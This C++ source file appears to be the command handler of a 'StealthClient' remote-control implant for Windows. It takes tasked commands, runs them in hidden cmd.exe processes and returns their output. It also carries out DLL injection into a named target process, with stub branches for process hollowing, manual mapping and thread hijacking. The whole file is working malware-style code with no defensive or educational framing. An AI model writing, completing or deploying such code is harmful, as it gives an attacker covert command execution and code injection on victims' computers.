#include "command_handler.h"
#include <iostream>
#include <sstream>
#include <algorithm>
#include <windows.h>
#include <tlhelp32.h>

namespace StealthClient {

CommandHandler::CommandHandler()
{
}

CommandHandler::~CommandHandler()
{
}

void CommandHandler::SetOutputCallback(OutputCallback callback)
{
    m_outputCallback = callback;
}

void CommandHandler::ExecuteCommand(const std::string& taskId, const std::string& command)
{
    std::cout << "[CommandHandler] Executing command: " << command << " (Task ID: " << taskId << ")" << std::endl;
    
    std::string output;
    std::string status = "success";
    
    try {
        if (IsInjectionCommand(command)) {
            output = ExecuteInjectionCommand(command);
        } else {
            output = ExecuteSystemCommand(command);
        }
    }
    catch (const std::exception& e) {
        output = "Error: " + std::string(e.what());
        status = "error";
    }
    catch (...) {
        output = "Unknown error occurred during command execution";
        status = "error";
    }
    
    std::cout << "[CommandHandler] Command output: " << output << std::endl;
    
    if (m_outputCallback) {
        m_outputCallback(taskId, output, status);
    }
}

std::string CommandHandler::ExecuteSystemCommand(const std::string& command)
{
    std::stringstream output;
    
    // Create process to execute command
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    
    // Create pipes for output
    HANDLE hReadPipe, hWritePipe;
    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = nullptr;
    
    if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
        return "Failed to create pipe";
    }
    
    // Ensure read handle is not inherited
    SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0);
    
    si.hStdOutput = hWritePipe;
    si.hStdError = hWritePipe;
    
    // Prepare command line
    std::string cmdLine = "cmd.exe /c " + command;
    
    // Create process
    if (!CreateProcessA(nullptr, const_cast<char*>(cmdLine.c_str()), nullptr, nullptr, 
                       TRUE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
        CloseHandle(hReadPipe);
        CloseHandle(hWritePipe);
        return "Failed to create process";
    }
    
    // Close write handle in parent process
    CloseHandle(hWritePipe);
    
    // Read output
    char buffer[4096];
    DWORD bytesRead;
    while (ReadFile(hReadPipe, buffer, sizeof(buffer) - 1, &bytesRead, nullptr) && bytesRead > 0) {
        buffer[bytesRead] = '\0';
        output << buffer;
    }
    
    // Wait for process to complete
    WaitForSingleObject(pi.hProcess, 30000); // 30 second timeout
    
    // Get exit code
    DWORD exitCode;
    GetExitCodeProcess(pi.hProcess, &exitCode);
    
    if (exitCode != 0) {
        output << "\n[Exit Code: " << exitCode << "]";
    }
    
    // Cleanup
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hReadPipe);
    
    return output.str();
}

std::string CommandHandler::ExecuteInjectionCommand(const std::string& command)
{
    std::stringstream output;
    
    // Parse injection command
    // Format: "inject <target_process> <payload_path> [method]"
    std::istringstream iss(command);
    std::string cmd, targetProcess, payloadPath, method = "dll_injection";
    
    iss >> cmd >> targetProcess >> payloadPath;
    if (iss >> method) {
        // Method specified
    }
    
    output << "Executing injection command:\n";
    output << "Target Process: " << targetProcess << "\n";
    output << "Payload: " << payloadPath << "\n";
    output << "Method: " << method << "\n";
    
    // Find target process
    DWORD processId = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        
        if (Process32First(hSnapshot, &pe32)) {
            do {
                if (_stricmp(pe32.szExeFile, targetProcess.c_str()) == 0) {
                    processId = pe32.th32ProcessID;
                    break;
                }
            } while (Process32Next(hSnapshot, &pe32));
        }
        CloseHandle(hSnapshot);
    }
    
    if (processId == 0) {
        output << "Error: Target process '" << targetProcess << "' not found\n";
        return output.str();
    }
    
    output << "Found target process ID: " << processId << "\n";
    
    // Execute injection based on method
    bool success = false;
    
    if (method == "dll_injection") {
        success = m_injection.dllInjection(processId, payloadPath);
        output << "DLL Injection " << (success ? "succeeded" : "failed") << "\n";
    }
    else if (method == "process_hollowing") {
        // For process hollowing, we need a payload file
        std::vector<BYTE> payload;
        // Load payload from file (simplified)
        output << "Process hollowing requires payload loading implementation\n";
    }
    else if (method == "manual_mapping") {
        // For manual mapping, we need DLL data
        std::vector<BYTE> dllData;
        // Load DLL data from file (simplified)
        output << "Manual DLL mapping requires DLL data loading implementation\n";
    }
    else if (method == "thread_hijacking") {
        // For thread hijacking, we need shellcode
        std::vector<BYTE> shellcode;
        // Load shellcode (simplified)
        output << "Thread hijacking requires shellcode loading implementation\n";
    }
    else {
        output << "Unknown injection method: " << method << "\n";
        output << "Available methods: dll_injection, process_hollowing, manual_mapping, thread_hijacking\n";
    }
    
    return output.str();
}

bool CommandHandler::IsInjectionCommand(const std::string& command)
{
    // Check if command starts with injection keywords
    std::string lowerCommand = command;
    std::transform(lowerCommand.begin(), lowerCommand.end(), lowerCommand.begin(), ::tolower);
    
    return lowerCommand.find("inject") == 0 ||
           lowerCommand.find("hollow") == 0 ||
           lowerCommand.find("map") == 0 ||
           lowerCommand.find("hijack") == 0;
}

} // namespace StealthClient
